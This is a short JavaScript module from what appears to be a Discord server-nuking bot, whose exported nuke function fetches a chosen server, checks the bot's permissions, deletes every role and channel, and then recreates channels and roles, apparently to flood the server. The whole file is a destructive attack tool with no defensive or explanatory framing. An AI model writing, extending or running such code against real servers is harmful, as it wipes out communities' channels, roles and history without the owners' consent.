import { ChannelManager } from "./channel.js";
import { RoleManager } from "./role.js";
import checkPermissions from "./checkPermission.js";
import { client } from "../index.js";
import { selectedGuild } from "../alert/getGuild.js";
export default async function nuke() {
  const guild = await client.guilds.fetch(selectedGuild.id);
  const bot = await guild.members.fetch(client.user.id);

  if (!(await checkPermissions(bot))) return;

  const deleteRoles = RoleManager.deleteAllRoles(guild);
  const deleteChannels = ChannelManager.deleteAllChannels(guild);

  await deleteRoles;
  await deleteChannels;

  const createChannels = ChannelManager.createChannel(guild);
  const createRoles = RoleManager.createRole(guild);

  await createChannels;
  await createRoles;
}
